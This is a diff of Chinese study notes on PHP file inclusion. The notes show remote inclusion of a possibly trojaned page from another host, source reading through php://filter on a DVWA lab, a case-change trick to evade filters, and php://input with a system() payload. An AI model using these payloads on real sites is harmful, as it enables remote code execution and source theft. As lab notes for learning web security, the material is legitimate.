@@ -28,7 +28,7 @@
 
 ###0X02 PHP远程包含实例
    1. 首先打开C:\php\php-5.2.14-win32\php-apache2handler.ini文件（大家的文件路径不一定是这个，大家一般的路径是php.ini），找到allow_url_include = off这一行，【把off改成on】
-   2. 然后找到存在包含漏洞的页面，将包含函数的参数改为远程的一个页面（远程地址），如page = http://192.168.1.103:8080/index.asp，能看到直接运行起来了。如果index.asp是一个木马呢或者是一个php的木马页面呢？是不是也能运行起来，很危险了吧。
+   2. 然后找到存在包含漏洞的页面，将包含函数的参数改为远程的一个页面（远程地址），如[page = http://192.168.1.103:8080/index.asp]，能看到直接运行起来了。如果index.asp是一个木马呢或者是一个php的木马页面呢？是不是也能运行起来，很危险了吧。
 
 
 
@@ -38,7 +38,7 @@
 * 如： http://192.168.2.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php , 访问URL，得到经过base64加密后的字符串。经解密还原即可得到x.php。
 * 【page(参数)=php://filter/read=convert.base64-encode/resource=xXX.php】有时候需要将read变成大写Read来绕过一些过滤，如sctf的homework
 * http的内置协议是php协议php://filter
-* 【条件】：一定要有GET传入 $_GET
+* 【条件】：服务端一定要有传入参数的过程，不管客户端是以$_GET形式还是$_POST形式提交的数据。
 
 ###0X04 PHP包含写文件
 *  构造URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input ， 并且提交post数据为<?php system('netuser');?>?????【即自己要写入的内容】
